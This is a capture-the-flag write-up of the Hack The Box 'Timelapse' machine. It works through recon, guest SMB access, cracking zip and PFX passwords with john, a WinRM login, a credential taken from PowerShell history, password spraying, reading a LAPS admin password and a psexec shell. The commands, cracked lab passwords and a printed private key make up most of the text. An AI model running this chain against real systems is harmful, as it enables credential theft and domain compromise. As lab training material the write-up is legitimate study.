---
{"dg-publish":true,"permalink":"/ct-fs/htb/timelapse/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #LAPS #leaked_creds #john #evil-winrm #psexec #weak_passwords #powershell_history #openssl #pfx #smb 



## Recon
![Pasted image 20261021122813.png](/img/user/CTFs/HTB/Images/Timelapse%20Images/Pasted%20image%2020261021122813.png)

### Nmap:
```zsh
nmap -p53,135,88,139,389,445,464,593,636,3268,3269,5986,9389,49673,49667,49695,49674 -sV -sC -T4 -Pn -oA 10.129.136.179 10.129.136.179
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-21 15:24 -0400
Nmap scan report for 10.129.136.179
Host is up (0.091s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-22 03:24:53Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
|_ssl-date: 2026-10-22T03:26:10+00:00; +7h59m53s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-22T03:25:51
|_  start_date: N/A
|_clock-skew: mean: 7h59m52s, deviation: 0s, median: 7h59m52s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.81 seconds

```
Initial Portscanning shows the standard suite of Windows Ports including Domain Services, Kerberos, SMB, LDAP, and MSRPC

### Port 445 (SMB)
#### NXC
```zsh
└─$ nxc smb dc01.timelapse.htb -u "Guest" -p '' --shares                                          
SMB         10.129.136.179  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.136.179  445    DC01             [+] timelapse.htb\Guest: 
SMB         10.129.136.179  445    DC01             [*] Enumerated shares
SMB         10.129.136.179  445    DC01             Share           Permissions     Remark
SMB         10.129.136.179  445    DC01             -----           -----------     ------
SMB         10.129.136.179  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.136.179  445    DC01             C$                              Default share
SMB         10.129.136.179  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.136.179  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.136.179  445    DC01             Shares          READ            
SMB         10.129.136.179  445    DC01             SYSVOL                          Logon server share 

```
Checking for Guest access we find that we have read access to a `Shares` share. This is nonstandard for SMB shares.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/scanning]
└─$ smbclient -U 'timelapse.htb/Guest%' \\\\dc01.timelapse.htb\\Shares           
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

		6367231 blocks of size 4096. 1270217 blocks available
```
Connecting to the share we see two directories `Dev` and `Helpdesk`.

```zsh
total 1.9M
4.0K drwxrwxr-x 2 kali kali 4.0K Oct 21 15:39 .
4.0K drwxrwxr-x 6 kali kali 4.0K Oct  9 16:31 ..
104K -rw-r--r-- 1 kali kali 102K Oct 21 15:32 LAPS_Datasheet.docx
628K -rw-r--r-- 1 kali kali 627K Oct 21 15:32 LAPS_OperationsGuide.docx
 72K -rw-r--r-- 1 kali kali  71K Oct 21 15:32 LAPS_TechnicalSpecification.docx
1.1M -rw-r--r-- 1 kali kali 1.1M Oct 21 15:32 LAPS.x64.msi
4.0K -rw-r--r-- 1 kali kali 2.6K Oct 21 15:31 winrm_backup.zip
```
I downloaded local copies of each directory's contents. The `Dev` endpoint has a `winrm_backup.zip` and the `Helpdesk` endpoint had all the docs for LAPS.  

## Initial Access
### Leaked Credentials & Overly broad SMB share access
#### Cracking Zip Archive password
```zsh
└─$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 

```
We attempt to unzip the backup archive and discover that it's password protecting `legacyy_dev_auth.pfx`. This may be a hint; let's see if we can snag it with `john`

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ zip2john winrm_backup.zip > zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ cat zip.hash           
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```
We first convert the zip archive challenge/response hash into a format `john` can work with and save it to a file for ease-of-use.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-10-21 15:51) 5.882g/s 20431Kp/s 20431Kc/s 20431KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We pass the file along with `rockyou.txt` as our wordlist and `john` instantly cracks the archive's hash and outputs the password in plaintext: `supremelegacy`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ ls
total 1.9M
4.0K drwxrwxr-x 2 kali kali 4.0K Oct 21 15:52 .
4.0K drwxrwxr-x 6 kali kali 4.0K Oct  9 16:31 ..
104K -rw-r--r-- 1 kali kali 102K Oct 21 15:32 LAPS_Datasheet.docx
628K -rw-r--r-- 1 kali kali 627K Oct 21 15:32 LAPS_OperationsGuide.docx
 72K -rw-r--r-- 1 kali kali  71K Oct 21 15:32 LAPS_TechnicalSpecification.docx
1.1M -rw-r--r-- 1 kali kali 1.1M Oct 21 15:32 LAPS.x64.msi
4.0K -rwxr-xr-x 1 kali kali 2.5K Oct 25  2021 legacyy_dev_auth.pfx
4.0K -rw-r--r-- 1 kali kali 2.6K Oct 21 15:31 winrm_backup.zip
8.0K -rw-rw-r-- 1 kali kali 4.9K Oct 21 15:50 zip.hash
```
I input the password at the unzip prompt and it inflates the file `legacyy_dev_auth.pfx` which is a credential used in certificate and private key based authentication. However, we need to verify the username associated with this credential.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ cat legacyy_dev_auth.pfx | strings
_	Er
C(!,
4bz'
`o<l
|Y4W
I0{Q
L(vqQ#
{q[l"8
`+$DOC
hK*y
;5UERr
X!+3
&JCy
$-1f
NAM'u
"-r$$
Legacyy0
211025140552Z
311025141552Z0
Legacyy0
r"*J0:
cZK3
".G,
x0v0
legacyy@timelapse.htb0
}J5~f
t{(lz
5&8H
&4<6
kj@1
uUh2s
```
passing it through strings we see `legacyy@timelapse.htb` confirming our user. Let's see if we can get the plaintext password or NT hash for this user.

#### Cracking PFX password

```zsh
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ 
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:24 DONE (2026-10-21 15:59) 0.04140g/s 133819p/s 133819c/s 133819C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We once again can rely on `john` to help us crack `legacyy's` PFX file password via `pfx2john` to create a hash format useable by `jtr`. It cracks after some time with the password for the file.`
#### Extracting certificates from PFX for use in WinRM session
```zsh
kali@kali:~/CTF/HTB/timelapse/files$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes 
Enter Import Password:
                                                                                                                                                                                                                                            
kali@kali:~/CTF/HTB/timelapse/files$ ls
total 1.9M
4.0K drwxrwxr-x 3 kali kali 4.0K Oct 21 16:37 .
4.0K drwxrwxr-x 6 kali kali 4.0K Oct  9 16:31 ..
4.0K drwxrwxr-x 5 kali kali 4.0K Oct 21 16:15 extracted
104K -rw-r--r-- 1 kali kali 102K Oct 21 15:32 LAPS_Datasheet.docx
628K -rw-r--r-- 1 kali kali 627K Oct 21 15:32 LAPS_OperationsGuide.docx
 72K -rw-r--r-- 1 kali kali  71K Oct 21 15:32 LAPS_TechnicalSpecification.docx
1.1M -rw-r--r-- 1 kali kali 1.1M Oct 21 15:32 LAPS.x64.msi
4.0K -rwxr-xr-x 1 kali kali 2.5K Oct 25  2021 legacyy_dev_auth.pfx
4.0K -rw------- 1 kali kali 2.0K Oct 21 16:37 legacyy.key
8.0K -rw-rw-r-- 1 kali kali 5.0K Oct 21 15:58 pfx.hash
4.0K -rw-r--r-- 1 kali kali 2.6K Oct 21 15:31 winrm_backup.zip
8.0K -rw-rw-r-- 1 kali kali 4.9K Oct 21 15:50 zip.hash
                                                                                                                                                                                                                                            
kali@kali:~/CTF/HTB/timelapse/files$ cat legacyy.key                   
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----
                                                                                                                                                                                                                                            
kali@kali:~/CTF/HTB/timelapse/files$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt 
Completing file
legacyy_dev_auth.pfx*  legacyy.key          
kali@kali:~/CTF/HTB/timelapse/files$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
Enter Import Password:
```
After some online research it seems we must pull the keys from this certificate using `openssl` and extract them to separate public and private key files for use with `evil-winrm`. We are asked for an Import Password and use our cracked `thuglegacy` from before to successfully make these extractions.

```zsh
kali@kali:~/CTF/HTB/timelapse/files$ evil-winrm -i 10.129.136.179 -u 'legacyy@timelapse.htb' -c legacyy.crt -k legacyy.key -S
                                        
Evil-WinRM shell v4.1
                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\legacyy\Documents> dir
*Evil-WinRM* PS C:\Users\legacyy\Documents>

*Evil-WinRM* PS C:\Users\legacyy\Documents> dir ../Desktop


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/21/2026   8:21 PM             34 user.txt

```
We then pass each key: `legacyy.crt` for the public key and `legacyy.key` for the private and successfully login to the DC as `legacyy` and find our `user.txt` sitting in their Desktop folder.

## Privilege Escalation
### Leaked Credentials (Powershell History)
#### Reading powershell history on the server
```zsh
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```
Checking the powershell history we find a plaintext password is hidden inside. Let's get a list of users to spray this with.

```zsh
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX

```
We successfully get a user list with our previous WinRM session.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ nxc smb dc01.timelapse.htb -u users.txt -p 'E3R$Q62^12p7PLlC%KWaxuaV' 
SMB         10.129.136.179  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\Administrator:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\babywyrm:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\Guest:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\krbtgt:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\legacyy:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\payl0ad:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [-] timelapse.htb\sinfulz:E3R$Q62^12p7PLlC%KWaxuaV STATUS_LOGON_FAILURE 
SMB         10.129.136.179  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```
Successfully spray and authenticate as user `svc_deploy` with that leaked credential.
#### Bloodhound Loot
![Pasted image 20261021143732.png](/img/user/CTFs/HTB/Images/Timelapse%20Images/Pasted%20image%2020261021143732.png)

#### Reading Legacy LAPS password for Administrator
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ bloodyad --host 10.129.136.179 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime  

distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: HG0vZ3rb+7-B0w+{a8c{Z0+{
ms-Mcs-AdmPwdExpirationTime: 13437544930220203
```
Pulling `bloodhound` loot we can see that our user has the `ReadLAPSPassword` attribute which is pretty self-explanatory as to it's meaning. We successfully read out the LAPS password for the Administrator using `bloodyad`. This password is the plaintext password for `Administrator` on the server since it's using the `ms-Mcs-AdmPwd` attribute. This let's us know that legacy LAPS is in use and that this value is in plaintext. Pwned.

#### Getting an Admin Shell
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/timelapse/files]
└─$ impacket-psexec -dc-ip 10.129.136.179 -target-ip 10.129.136.179 'timelapse.htb/Administrator:HG0vZ3rb+7-B0w+{a8c{Z0+{@dc01.timelapse.htb' cmd.exe
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.136.179.....
[*] Found writable share ADMIN$
[*] Uploading file TLYklUHX.exe
[*] Opening SVCManager on 10.129.136.179.....
[*] Creating service AwAB on 10.129.136.179.....
[*] Starting service AwAB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2686]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ..\..\Users

C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users

02/23/2022  06:45 PM    <DIR>          .
02/23/2022  06:45 PM    <DIR>          ..
10/23/2021  11:27 AM    <DIR>          Administrator
10/25/2021  08:22 AM    <DIR>          legacyy
10/23/2021  11:27 AM    <DIR>          Public
10/25/2021  12:23 PM    <DIR>          svc_deploy
02/23/2022  06:45 PM    <DIR>          TRX
               0 File(s)              0 bytes
               7 Dir(s)   5,459,517,440 bytes free

C:\Users> dir Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\Administrator\Desktop

03/03/2022  08:48 PM    <DIR>          .
03/03/2022  08:48 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   5,459,451,904 bytes free

C:\Users> dir TRX\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\TRX\Desktop

03/03/2022  11:45 PM    <DIR>          .
03/03/2022  11:45 PM    <DIR>          ..
10/21/2026  08:21 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,459,451,904 bytes free
```
For whatever reason, I couldn't get a shell as `Administrator` with WinRM so I used `psexec` instead and was able to then find `root.txt` sitting in user `TRX's` Desktop folder.

## Final Thoughts
>[!Takeaways]
>- When you find a `pfx` file. Be sure to run it through `strings` and `openssl` to extract the user info from it.
>- When you have a pfx file that is self-signed and unusable externally as is, be sure to extract the public and private key data separately to auth with via WinRM
>- Always check the PS history at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
>- When reading the LAPS password, if you see `ms-Mcs-AdmPwd:` you know legacy LAPS is in use and that password is the plaintext password of the Administrator
>- If one shell doesn't work, try another.

